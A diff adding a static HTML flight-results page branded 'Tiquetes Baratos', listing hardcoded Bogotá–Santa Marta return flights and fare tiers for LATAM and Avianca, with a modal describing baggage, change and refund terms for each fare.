@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiquetes Baratos | Tiquetes, vuelos, hoteles y más</title>
+    <link rel="shortcut icon" href="./assets/svg/logo-tiquetesbaratos.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+
+    <!-- SCRIPTS -->
+    <script src="./js/functions.js"></script>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/datepicker.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/tw.css">
+</head>
+
+<body>
+    <div class="modal modal-loader">
+        <span class="loader"></span>
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="w-full flex flex-row justify-between items-center p-3 mb-2">
+        <img width="60px" src="./assets/svg/logo-tiquetesbaratos.png">
+        <img width="25px" src="./assets/svg/burger_menu.png">
+    </nav>
+
+
+
+
+
+    <!-- FLIGHT RESUME -->
+    <div onclick="window.location.href = 'index.html'" class="cursor-pointer px-5 py-1 bg-resume text-white flex flex-row justify-between items-center">
+        <div>
+            <p id="resume-departures-label">BOG | SMR</p>
+            <div class="flex flex-row justify-start items-center gap-2">
+                <img src="./assets/svg/date2_icon.png" width="15px">
+                <p id="resume-dates-label">22 ene 2025 | 26 ene 2025</p>
+                <img class="ml-2" src="./assets/svg/passengers2_icon.png" width="16px">
+                <p id="resume-passengers-label">1</p>
+            </div>
+        </div>
+        <div class="rounded-full p-2 bg-[#2196F3]">
+            <img src="./assets/svg/search2_icon.png" width="20px">
+        </div>
+    </div>
+
+    <p class="px-4 my-3 text-[#333]">Tarifas por viajero con impuestos y sobrecargos en pesos colombianos (COP$).</p>
+    <div class="flex flex-row gap-1 px-4 justify-start items-center text-[#333]">
+        <img src="./assets/svg/plane2_icon.png" width="20px">
+        <p class="poppins-medium text-2xl">Vuelos de regreso</p>
+    </div>
+
+    <!-- FLIGHTS -->
+    <!-- LATM -->
+    <div class="flights flights-latam mx-3 mb-5">
+        <div class="px-3 py-3">
+            <img src="./assets/svg/ltm_logo.png" width="100px">
+        </div>
+        <div class="bg-[#2A0088] text-white py-3 px-2">
+            <p id="flight-date-label"><b>Bogotá </b>(BOG) - <b>Santa Marta</b>(SMR)</p>
+        </div>
+        <div class="w-full flex flex-row items-center justify-start p-3 cursor-pointer" onclick="openModal('ltm-ticket-level')">
+            <div class="px-2 gap-1 w-full flex flex-row shadow-md justify-start items-center">
+                <p class="font-medium text-[#186bdf] underline">¿Qué incluye cada tarifa?</p>
+                <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+            </div>
+        </div>
+        <div id="flights-latam" class="px-2">
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>05:15</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>6:30</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#ffff54] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Basic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#f8f7fb] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Light</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#edeaf5] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Full</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="full-price">$ 323.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="3" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d9d2ea] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Preimum</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>9:15</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>10:30</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#ffff54] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Basic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#f8f7fb] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Light</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#edeaf5] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Full</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="full-price">$ 323.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="3" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d9d2ea] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Preimum</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>11:42</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>13:00</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#ffff54] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Basic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#f8f7fb] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Light</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#edeaf5] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Full</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="full-price">$ 323.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="3" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d9d2ea] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Preimum</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="ltm" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="ltm-ticket-level" class="modal bg-white">
+        <div class="px-5 py-5 text-[#333] border-b poppins-semibold text-lg flex flex-row justify-between items-center">
+            <p>¿Qué incluye cada tarifa?</p>
+            <img onclick="closeModal('ltm-ticket-level')" class="w-[22px]" src="./assets/svg/x_gray.png">
+        </div>
+        <div class="flex flex-row overflow-x-scroll px-5 py-5 gap-4">
+            <!-- BASIC -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-green-600"></span>
+                <p class="poppins-semibold text-green-600 px-5 py-3">Basic</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Exceso de equipaje </br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Primer exceso de equipaje con costo extra</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Asiento </br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Reserva de asiento básico con costo extra</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Articulo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Reembolso</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Desde $110 USD antes de la partida, aplica términos y condiciones, validar con la aerolínea / Desde $110 USD después de la partida, aplica términos y condiciones, validar con la aerolínea</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Desde $26 USD antes de la partida, aplica términos y condiciones, validar con la aerolínea / Desde $26 USD después de la partida, aplica términos y condiciones, validar con la aerolínea</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- LIGHT -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#DC1F2F]"></span>
+                <p class="poppins-semibold text-[#DC1F2F] px-5 py-3">Light</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6 border-b pb-3">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (12 kg.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Artículo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido cambio con cargo + diferencia de precio</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- FULL -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#5C469C]"></span>
+                <p class="poppins-semibold text-[#5C469C] px-5 py-3">Full</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (12 kg.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6 border-b pb-3">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje Documentado</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (23 kg.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Asiento</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido selección de asiento estándar</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Artículo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Reembolsos</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido devolución antes de la salida del primer vuelo                        </span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido cambio con cargo + diferencia de precio</span>
+                    </p>
+                </div>
+            </div>
+
+            <!-- PREMIUM -->
+            <div class="min-w-[250px] rounded-lg py-2 px-2 border-2 border-zinc-300 text-xl">
+                <span class="block rounded-full w-[25%] py-1 bg-[#2193E9]"></span>
+                <p class="poppins-semibold text-[#2193E9] px-5 py-3">Premium</p>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje de Mano</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (12 kg.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6 border-b pb-3">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Equipaje Documentado</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida (23 kg.)</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Artículo Personal</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">1 pieza incluida</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Prioridad al abordar</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido incluido embarque y desembarque prioritario</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Aperitivo o Comidas</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido mejor oferta gastrónomica</span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Reembolsos</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido devolución antes de la salida del primer vuelo                        </span>
+                    </p>
+                </div>
+                <div class="mb-3 flex flex-row items-start justify-start gap-2 leading-6">
+                    <span class="text-zinc-300">●</span>
+                    <p class="text-[15px] text-[#333s] poppins-medium">Cambios</br>
+                        <span class="text-zinc-500" style="font-family: sans-serif !important;">Incluido cambio con cargo + diferencia de precio</span>
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- AVICA -->
+    <div class="flights flights-avianca mx-3 mb-5">
+        <div class="px-3 py-3">
+            <img src="./assets/svg/avi_logo.png" width="100px">
+        </div>
+        <div class="bg-[#DA291C] text-white py-3 px-2">
+            <p id="flight-date-label"><b>Bogotá </b>(BOG) - <b>Santa Marta</b>(SMR)</p>
+        </div>
+        <div class="w-full flex flex-row items-center justify-start p-3 cursor-pointer" onclick="openModal('avi-ticket-level')">
+            <div class="px-2 gap-1 w-full flex flex-row shadow-md justify-start items-center">
+                <p class="font-medium text-[#186bdf] underline">¿Qué incluye cada tarifa?</p>
+                <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+            </div>
+        </div>
+        <div class="px-2">
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>09:24</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>10:40</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#ffff54] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Basic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#f8f7fb] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Classic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#d9d2ea] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Flex</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="premium-price">$ 353.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="4" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+            </div>
+            <div class="rounded-lg shadow mb-3 border border-[#0ff0f] overflow-hidden">
+                <div class="px-3 py-3 flex flex-row items-center justify-between text-lg border-b border-[#0ff0f]">
+                    <div class="w-full flex flex-row gap-5 font-semibold items-center">
+                        <p>13:40</p>
+                        <img src="./assets/svg/plane2_icon.png" width="20px">
+                        <p>14:55</p>
+                    </div>
+                    <p class="font-semibold text-[#2196F3]">Directo</p>
+                </div>
+                <div class="w-full bg-[#ffff54] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Basic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="basic-price">$ 233.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="1" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
+                <div class="w-full bg-[#f8f7fb] px-3 py-1 border-b-2 border-white">
+                    <div class="w-full flex flex-row justify-between">
+                        <div class="flex flex-row items-center gap-1">
+                            <svg xmlns="http://www.w3.org/2000/svg"viewBox="0 0 24 24"width="20"height="20"fill="#95A5A6"><circle cx="12" cy="12" r="10" /><rect x="11" y="10" width="2" height="6" fill="white" /><circle cx="12" cy="7" r="1" fill="white" /></svg>
+                            <span>Classic</span>
+                        </div>
+                        <div class="flex flex-row items-center gap-2">
+                            <label for="fgo-1" id="light-price">$ 273.700</label>
+                            <input type="radio" name="fgo-1">
+                        </div>
+                    </div>
+                    <div id="select-flight" data-flight-level="2" data-aeroline="avi" class="hidden cursor-pointer mt-4 py-3 w-full mb-4 flex justify-center items-center font-semibold rounded bg-[#2196F3] text-white">
+                        <span>Seleccionar vuelo de regreso</span>
+                    </div>
+                </div>
